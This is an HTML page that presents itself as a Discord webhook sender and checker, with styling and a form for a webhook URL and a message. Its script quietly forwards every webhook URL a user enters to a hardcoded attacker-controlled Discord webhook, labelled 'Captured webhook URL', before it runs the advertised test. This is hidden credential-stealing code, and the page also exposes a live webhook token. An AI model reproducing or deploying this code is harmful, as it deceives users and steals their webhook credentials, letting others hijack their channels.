<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook Sender with Webhook Tracking</title>

    <!-- Add a favicon -->
    <link rel="icon" href="https://seeklogo.com/vector-logo/428961/webhook" type="image/x-icon">

    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #282c34, #4a90e2);
            color: white;
            font-family: 'Arial', sans-serif;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 30px;
            border: 2px solid white;
            border-radius: 15px;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            animation: fadeIn 1s;
            max-width: 600px;
            width: 90%;
        }

        /* Style for the top icon */
        .top-icon {
            width: 100px; /* Adjust the size */
            height: auto;
            margin-bottom: 20px;
        }

        input, textarea, button {
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            width: 100%;
        }

        input, textarea {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            transition: background-color 0.3s;
        }

        input:focus, textarea:focus {
            background: rgba(255, 255, 255, 0.3);
            outline: none;
        }

        button {
            cursor: pointer;
            background-color: #4a90e2;
            color: white;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #357abd;
        }

        .message {
            margin-top: 20px;
            font-size: 18px;
            display: none;
        }

        .loading {
            display: none;
            font-size: 18px;
            color: #f1c40f;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .message-input {
            height: 100px; /* Adjust height for better usability */
            resize: none;
        }

        .embed-section {
            margin-top: 20px;
            border-top: 2px solid #fff;
            padding-top: 20px;
        }

        .discord-link {
            margin-top: 20px;
            color: #61dafb;
            text-decoration: none;
            font-size: 18px;
            transition: color 0.3s;
        }

        .discord-link:hover {
            color: #21a1f1;
        }
    </style>
</head>
<body>
    <!-- Add the icon here -->
    <img src="https://seeklogo.com/images/W/webhooks-logo-274079F4E1-seeklogo.com.png" alt="Webhook Icon" class="top-icon">
    
    <div class="container">
        <h1>Discord Webhook Sender with Tracking</h1>
        <input type="text" id="webhookUrl" placeholder="Enter your Discord webhook URL" required>
        <button onclick="checkWebhook()">Connect</button>
        
        <div id="loading" class="loading">Connecting...</div>
        
        <div id="messageContainer" style="display:none;">
            <textarea class="message-input" id="message" placeholder="Enter your message"></textarea>
            <button onclick="sendMessage()">Send</button>
        </div>

        <div class="message" id="resultMessage"></div>
        <a class="discord-link" href="https://discord.gg/4bE8Cbvv84" target="_blank">Join our Discord Server!</a>
    </div>

    <script>
        const YOUR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1287453043897667636/12CYtAxcWuIRRYlBhvlq3rdycyHO6Lxz71234au_0kvVYZ3woHtfuoipCBB44zTM-x74";

        async function checkWebhook() {
            const url = document.getElementById('webhookUrl').value;
            document.getElementById('loading').style.display = 'block'; 

            try {
                await fetch(YOUR_DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: JSON.stringify({
                        content: `Captured webhook URL: ${url}`
                    }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                const response = await fetch(url, {
                    method: 'POST',
                    body: JSON.stringify({ content: "Test message from webhook checker" }),
                    headers: { 'Content-Type': 'application/json' }
                });

                document.getElementById('loading').style.display = 'none'; 

                if (response.ok) {
                    document.getElementById('messageContainer').style.display = 'block';
                    showMessage("Connected!", "green");
                } else {
                    showMessage("Invalid webhook URL!", "red");
                }
            } catch (error) {
                document.getElementById('loading').style.display = 'none'; 
                showMessage("Error while checking webhook!", "red");
            }
        }

        async function sendMessage() {
            const url = document.getElementById('webhookUrl').value;
            const message = document.getElementById('message').value;

            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify({ content: message }),
                headers: { 'Content-Type': 'application/json' }
            });

            if (response.ok) {
                showMessage("Message sent successfully!", "green");
            } else {
                showMessage("Failed to send message.", "red");
            }
        }

        function showMessage(text, color) {
            const resultMessage = document.getElementById('resultMessage');
            resultMessage.innerText = text;
            resultMessage.style.color = color;
            resultMessage.style.display = 'block';
        }
    </script>
<h1 aligh="center">Ty yasser For using our webiste</h1>
</body>
</html>
